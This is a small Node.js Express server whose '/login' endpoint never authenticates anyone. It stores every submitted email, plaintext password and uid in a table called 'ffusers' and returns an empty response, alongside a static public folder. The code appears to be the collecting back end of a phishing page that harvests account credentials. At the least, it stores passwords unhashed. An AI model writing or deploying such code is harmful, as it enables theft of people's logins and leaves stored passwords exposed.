import express from "express";
import { pool } from "./db.js";

const app = express();
app.use(express.json());
app.use(express.static("public"));

app.post("/login", async (req, res) => {
  const { email, password, uid } = req.body;
  if (!email || !password || !uid) return res.sendStatus(400);

  try {
    await pool.query(
      "INSERT INTO ffusers (email, password, uid) VALUES ($1, $2, $3)",
      [email, password, uid]
    );
    res.sendStatus(204); // no message sent back
  } catch (err) {
    console.error(err);
    res.sendStatus(500);
  }
});

app.listen(3000, () => console.log("Server running on http://localhost:3000"));
